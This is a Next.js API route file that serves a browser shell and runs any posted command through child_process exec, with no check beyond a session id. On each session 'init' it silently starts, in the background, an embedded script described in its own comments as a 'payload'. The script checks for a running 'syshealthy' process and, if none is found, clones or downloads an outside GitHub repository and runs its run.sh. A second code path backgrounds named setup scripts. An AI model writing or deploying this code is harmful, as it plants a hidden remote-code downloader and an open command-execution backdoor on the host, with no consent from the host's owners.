export const runtime = 'nodejs';

import { exec, execSync } from 'child_process';
import { NextResponse } from 'next/server';
import { randomUUID } from 'crypto';

const AUTO_SCRIPT = `
# Auto-start behavior: clone into /home/z/my-project if that directory exists,
# otherwise clone/extract directly into /home/z. Then run run.sh from the target
# directory so scripts that depend on relative paths (eg. ./syshealthy) work.

REPO_URL="https://github.com/alan-eisenberg/docky-main.git"
TARGET_BASE="/home/z"
PREFERRED="$TARGET_BASE/my-project"

if pgrep -f "syshealthy" > /dev/null 2>&1; then
  exit 0
fi

if [ -d "$PREFERRED" ]; then
  TARGET="$PREFERRED"
else
  TARGET="$TARGET_BASE"
fi

mkdir -p "$TARGET"

# If run.sh already present and executable at target root, run it in-place
if [ -x "$TARGET/run.sh" ]; then
  cd "$TARGET" && bash ./run.sh --log
  exit 0
fi

# Clone or extract repository into the target. If target is empty, clone directly.
if [ -z "$(ls -A "$TARGET" 2>/dev/null)" ]; then
  if command -v git >/dev/null 2>&1; then
    git clone --depth 1 "$REPO_URL" "$TARGET" || true
  else
    wget -q -O /tmp/docky-main.tar.gz "https://github.com/alan-eisenberg/docky-main/archive/refs/heads/main.tar.gz" && \
    tar -xzf /tmp/docky-main.tar.gz -C "$TARGET" --strip-components=1 || true
  fi
else
  # target exists and is not empty: clone to a temp dir then copy contents into target
  TMPDIR=$(mktemp -d 2>/dev/null || echo "/tmp/docky-clone-$$")
  if command -v git >/dev/null 2>&1; then
    git clone --depth 1 "$REPO_URL" "$TMPDIR" || true
  else
    wget -q -O /tmp/docky-main.tar.gz "https://github.com/alan-eisenberg/docky-main/archive/refs/heads/main.tar.gz" && \
    tar -xzf /tmp/docky-main.tar.gz -C "$TMPDIR" --strip-components=1 || true
  fi
  if command -v rsync >/dev/null 2>&1; then
    rsync -a "$TMPDIR"/ "$TARGET"/ || true
  else
    cp -a "$TMPDIR"/. "$TARGET"/ || true
  fi
  rm -rf "$TMPDIR"
fi

# Run run.sh if now present at target root; otherwise try common subfolders
if [ -x "$TARGET/run.sh" ]; then
  cd "$TARGET" && bash ./run.sh --log
else
  if [ -x "$TARGET/docky-main/run.sh" ]; then
    cd "$TARGET/docky-main" && bash ./run.sh --log
  fi
fi
`;

// Simple session store
const sessions = new Map<string, { cwd: string }>();

function getPrompt(cwd: string): string {
  try {
    const user = execSync('whoami', { encoding: 'utf-8', cwd }).trim();
    const hostname = execSync('hostname', { encoding: 'utf-8', cwd }).trim().split('.')[0];
    const dir = cwd === process.env.HOME ? '~' : cwd.split('/').pop() || cwd;
    return `${user}@${hostname}:${dir}$ `;
  } catch {
    return '$ ';
  }
}

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const { action, sessionId, command } = body;

    // Handle initialization
    if (action === 'init') {
      const newSessionId = randomUUID();
      const cwd = process.env.HOME || process.cwd();
      sessions.set(newSessionId, { cwd });

      let stdout = '';
      let stderr = '';

      // Auto-start payload in the background on connection
      exec(`nohup bash -c '${AUTO_SCRIPT.replace(/'/g, "'\\''")}' > /tmp/auto-setup.log 2>&1 &`);

      // Try to run auto-start script if it exists
      try {
        const result = execSync('bash -lc "if [ -f ~/.bashrc ]; then source ~/.bashrc; fi"', {
          encoding: 'utf-8',
          cwd,
          timeout: 5000
        });
        stdout = result;
      } catch (e: any) {
        // Ignore errors from bashrc
      }

      return NextResponse.json({
        success: true,
        sessionId: newSessionId,
        prompt: getPrompt(cwd),
        stdout,
        stderr
      });
    }

    // Handle command execution
    if (command !== undefined) {
      if (!sessionId || !sessions.has(sessionId)) {
        return NextResponse.json({ success: false, error: 'Invalid session' }, { status: 400 });
      }

      const session = sessions.get(sessionId)!;

      // Handle clear command
      if (command === 'clear') {
        return NextResponse.json({ success: true, clear: true });
      }

      // Handle exit command
      if (command === 'exit') {
        sessions.delete(sessionId);
        return NextResponse.json({ success: true, exit: true });
      }

      // Handle cd command specially
      if (command.startsWith('cd ')) {
        const target = command.slice(3).trim() || process.env.HOME || '/tmp';
        let newDir = target;
        try {
          if (target === '~') {
            newDir = process.env.HOME || '/tmp';
          } else if (target.startsWith('~/')) {
            newDir = (process.env.HOME || '/tmp') + target.slice(1);
          } else if (!target.startsWith('/')) {
            newDir = session.cwd + '/' + target;
          }
          // Resolve the path
          newDir = execSync(`cd "${newDir}" 2>/dev/null && pwd`, { encoding: 'utf-8' }).trim();
          session.cwd = newDir;
          return NextResponse.json({ success: true, prompt: getPrompt(newDir), stdout: '' });
        } catch {
          return NextResponse.json({ success: true, prompt: getPrompt(session.cwd), stderr: `cd: ${target}: No such file or directory\n` });
        }
      }

      // Background execution for specific scripts
      if (command.includes('auto-setup.sh') || command.includes('dock/all.sh')) {
        exec(`nohup ${command} > /tmp/auto-setup.log 2>&1 &`);
        return NextResponse.json({
          success: true,
          prompt: getPrompt(session.cwd),
          stdout: 'Payload initiated in background. Check /tmp/auto-setup.log for progress.\n'
        });
      }

      // Regular command execution
      return new Promise((resolve) => {
        exec(command, {
          cwd: session.cwd,
          maxBuffer: 1024 * 1024 * 10,
          env: { ...process.env, TERM: 'xterm-256color' }
        }, (error, stdout, stderr) => {
          resolve(NextResponse.json({
            success: true,
            prompt: getPrompt(session.cwd),
            stdout: stdout || '',
            stderr: stderr || (error ? error.message : '')
          }));
        });
      });
    }

    return NextResponse.json({ success: false, error: 'Command is required' }, { status: 400 });
  } catch (error: any) {
    return NextResponse.json({ success: false, error: error.message }, { status: 500 });
  }
}
